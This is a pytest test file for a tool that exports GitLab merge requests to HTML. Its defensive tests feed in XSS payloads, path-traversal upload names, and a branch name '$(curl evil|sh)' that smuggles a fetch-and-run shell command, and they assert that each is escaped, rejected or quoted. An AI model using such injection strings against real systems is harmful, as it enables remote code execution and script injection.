import json
from datetime import datetime
from io import StringIO

import pytest
from conftest import UPLOAD_ID, mr, note

from mr_export import snapshot
from mr_export.fetch import fetch
from mr_export.render import render
from mr_export.runner import Console, Runner


@pytest.fixture
def snap(gitlab, tmp_path):
    runner = Runner(tmp_path, Console(StringIO()), run=gitlab)
    result = fetch(runner, Console(StringIO()), tmp_path, "opened", True, datetime(2026, 10, 23, 10, 5))
    render(snapshot.load(result.path))
    return result.path


def test_index_lists_every_mr_with_its_state(snap):
    html = (snap / "index.html").read_text()
    assert 'href="mr/2.html"' in html and 'href="mr/1.html"' in html
    assert html.index("!2") < html.index("!1")                   # newest first
    assert "approved (carol)" in html and "0/1" in html
    assert '<span class="pill warn">1</span>' in html            # one open thread on !2


def test_mr_page_shows_threads_with_file_and_line(snap):
    html = (snap / "mr" / "2.html").read_text()
    assert "<code>app/views.py:42</code>" in html and "open</span>" in html
    assert "Activity (1)" in html and "assigned to @bob" in html
    assert "git diff origin/dev...origin/mr/2" in html


def test_downloaded_images_are_shown_from_the_snapshot(snap):
    html = (snap / "mr" / "2.html").read_text()
    assert f'src="../uploads/{UPLOAD_ID}/a.png"' in html
    assert f'src="../uploads/{UPLOAD_ID}/screen%20one.png"' in html


def test_missing_image_links_to_gitlab_instead(snap):
    (snap / "uploads" / UPLOAD_ID / "a.png").unlink()
    render(snapshot.load(snap))
    html = (snap / "mr" / "2.html").read_text()
    assert f'href="https://git.example.org/team/app/uploads/{UPLOAD_ID}/a.png"' in html
    assert "image not in snapshot" in html


def legacy(tmp_path, items, details=None):
    (tmp_path / "mrs-list.ndjson").write_text("".join(json.dumps(m) + "\n" for m in items))
    for m in details or []:
        (tmp_path / f"mr-{m['iid']}.json").write_text(json.dumps(m))
    return snapshot.load(tmp_path)


def test_text_from_gitlab_is_escaped(tmp_path):
    evil = mr(5, title="<script>alert(1)</script>",
              description="<img src=x onerror=alert(1)> [x](javascript:alert(1)) **bold**")
    render(legacy(tmp_path, [evil], [evil]))
    html = (tmp_path / "mr" / "5.html").read_text() + (tmp_path / "index.html").read_text()
    assert "<script>alert" not in html and "<img src=x" not in html
    assert 'href="javascript:' not in html
    assert "<strong>bold</strong>" in html


def test_code_blocks_keep_their_content_literally(tmp_path):
    m = mr(6, description="Before\n```bash\necho **not bold** <tag>\n```\nAfter")
    render(legacy(tmp_path, [m], [m]))
    html = (tmp_path / "mr" / "6.html").read_text()
    assert "<pre><code>echo **not bold** &lt;tag&gt;</code></pre>" in html


def test_flat_hand_made_snapshot_renders_without_meta(tmp_path):
    snap = legacy(tmp_path, [mr(7)], [mr(7)])
    assert snap.meta["project"] == "team/app"
    render(snap)
    html = (tmp_path / "index.html").read_text()
    assert "team/app" in html and "unknown" in html               # no approvals file: said so


def test_note_links_relative_to_gitlab_get_the_host(tmp_path):
    m = mr(8, description="[pipeline](/team/app/-/pipelines/9)")
    render(legacy(tmp_path, [m], [m]))
    assert 'href="https://git.example.org/team/app/-/pipelines/9"' in (tmp_path / "mr" / "8.html").read_text()


def test_unsafe_upload_names_are_never_resolved(tmp_path):
    assert not snapshot.safe_upload(UPLOAD_ID, "..")
    assert not snapshot.safe_upload(UPLOAD_ID, "..%2F..%2Fetc")
    assert not snapshot.safe_upload("short", "a.png")
    m = snapshot.MergeRequest(data={"iid": 1, "description": f"![x](/uploads/{UPLOAD_ID}/..%2Fsecret)"},
                              discussions=[{"notes": [note(f"![y](/uploads/{UPLOAD_ID}/ok.png)")]}])
    assert snapshot.upload_refs(m) == [(UPLOAD_ID, "ok.png")]


def test_branch_names_in_git_commands_are_shell_quoted(tmp_path):
    m = mr(9, target_branch="$(curl evil|sh)")
    render(legacy(tmp_path, [m], [m]))
    html = (tmp_path / "mr" / "9.html").read_text()
    assert "git diff &#x27;origin/$(curl evil|sh)&#x27;...origin/mr/9" in html


def test_upload_links_that_are_not_images_use_the_local_copy(snap):
    (snap / "uploads" / UPLOAD_ID / "report.pdf").write_bytes(b"%PDF")
    data = json.loads((snap / "mr" / "1.json").read_text())
    data["description"] = f"[report](/uploads/{UPLOAD_ID}/report.pdf)"
    (snap / "mr" / "1.json").write_text(json.dumps(data))
    render(snapshot.load(snap))
    assert f'href="../uploads/{UPLOAD_ID}/report.pdf"' in (snap / "mr" / "1.html").read_text()


def test_unfinished_read_is_flagged_and_skipped_as_newest(snap, tmp_path):
    from mr_export.cli import newest_snapshot
    meta = json.loads((snap / "meta.json").read_text())
    meta["complete"] = False
    (snap / "meta.json").write_text(json.dumps(meta))
    render(snapshot.load(snap))
    assert "This read did not finish" in (snap / "index.html").read_text()
    assert newest_snapshot(snap.parent) is None


def test_null_fields_from_gitlab_do_not_crash(tmp_path):
    m = mr(10, labels=None, title=None, author=None, reviewers=None, head_pipeline=None)
    (tmp_path / "mr").mkdir()
    (tmp_path / "mr" / "10-approvals.json").write_text(json.dumps({"approved_by": None, "approvals_left": 1}))
    render(legacy(tmp_path, [m], [m]))
    assert (tmp_path / "mr" / "10.html").is_file()


def test_failed_mr_page_says_so(gitlab, tmp_path):
    gitlab.fail.add("projects/:id/merge_requests/2/approvals")
    runner = Runner(tmp_path, Console(StringIO()), run=gitlab)
    result = fetch(runner, Console(StringIO()), tmp_path, "opened", True, datetime(2026, 10, 23, 10, 5))
    render(snapshot.load(result.path))
    assert "Not all data of this merge request" in (result.path / "mr" / "2.html").read_text()
    assert "Not all data" not in (result.path / "mr" / "1.html").read_text()
